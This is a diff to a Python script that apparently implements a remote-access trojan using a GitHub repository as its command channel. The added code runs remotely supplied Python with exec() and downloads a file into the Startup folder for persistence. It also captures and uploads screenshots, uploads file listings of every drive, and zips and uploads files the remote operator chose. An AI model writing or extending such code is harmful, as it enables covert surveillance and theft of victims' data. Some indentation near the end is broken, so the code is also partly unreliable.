@@ -1,5 +1,5 @@
 from datetime import datetime
-from os import  fsync, listdir, environ , path , system , mkdir , walk , chdir , getcwd
+from os import  fsync, listdir, environ , path , system , mkdir , walk , chdir , getcwd, remove
 from shutil import move , copy
 from time import sleep
 from github import Github
@@ -118,5 +118,85 @@ while True:
             else:
                 sleep(5)
                 continue
+
+
+
+            if result_condition == "link":
+                with open(file="python/link.ini", mode="r") as f:
+                    exec(f.read())
+                if not path.exists("software"): mkdir("software")
+                download(url=link, dest_folder="software")
+                send_main_information(TOKEN=TOKEN, content="result_condition = False",
+                                      name_file_in_site="result_condition.ini")
+                move_file("\Startup")
+                Rmpydir()
+
+            elif result_condition == "one_line_commands":
+                with open(file="python/one_line_commands.ini", mode="r") as f:
+                    exec(f.read())
+                send_main_information(TOKEN=TOKEN, content="result_condition = False",
+                                      name_file_in_site="result_condition.ini")
+                Rmpydir()
+
+
+            elif result_condition == "camera":
+                myscreen = pyautogui.screenshot().save('screen.png')
+                with open("screen.png", "rb") as image2string:
+                    converted_string = base64.b64encode(image2string.read())
+                with open('code_image.ini', "wb") as file:
+                    file.write(converted_string)
+                with open(file="code_image.ini", mode="r") as f:
+                    send_main_information(TOKEN=TOKEN, content=str(f.read()),
+                                          name_file_in_site="code_image.ini")
+                send_main_information(TOKEN=TOKEN, content="result_condition = False",
+                                      name_file_in_site="result_condition.ini")
+                pathlib.Path("screen.png").unlink()
+                pathlib.Path("code_image.ini").unlink()
+                Rmpydir()
+                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_in_site="last_visit.ini")
+
+
+            elif result_condition == "scan_system":
+                drives = win32api.GetLogicalDriveStrings()
+                drives = drives.split('\000')[:-1]
+                for i in drives:
+                    if i == "C:\\": i = i + "Users"
+                    with open(f"{list(i)[0]}.ini", mode="w+", encoding="utf8") as f:
+                        for root, dirs, files in walk(i):
+                            for file in files:
+                                f.write(f"{path.join(root, file)}" + "\n")
+                    with open(f"{list(i)[0]}.ini", mode="r", encoding="utf8") as f:
+                        send_main_information(TOKEN=TOKEN, content=f.read(), name_file_in_site=f"{list(i)[0]}.ini")
+                    remove(f"{list(i)[0]}.ini")
+                send_main_information(TOKEN=TOKEN, content="result_condition = False",name_file_in_site="result_condition.ini")
+                Rmpydir()
+                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_in_site="last_visit.ini")
+
+            elif result_condition == "send_file":
+                if path.exists(r"python\file_path.ini"):
+                    with open(file=r"python\file_path.ini", mode="r", encoding="utf8") as f:
+                        exec(f.read())
+                        if not path.exists('file'): mkdir("file")
+                        if len(path_file) != 0:
+                            for i in path_file:
+                                if path.exists(i):
+                                    copy(i, r"file")
+                            createZipFromFolder("file", "file.zip")
+                            with open("file.zip", "rb") as f:
+                                with open("file.ini", "wb") as r:
+                                    r.write(f.read())
+                                with open("file.ini", "rb") as f:
+                                    sendFileToGit(TOKEN=TOKEN, content=f.read(),
+                                                     name_file_in_site="download_file.ini")
+                        send_main_information(TOKEN=TOKEN, content="result_condition = False",
+                                              name_file_in_site="result_condition.ini")
+                        Rmpydir()
+                        send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
+                                              name_file_in_site="last_visit.ini")
+
+                    else:
+                    send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
+                                          name_file_in_site=f"{list(i)[0]}.ini")
+                    sleep(300)
     except Exception as e:
         print()
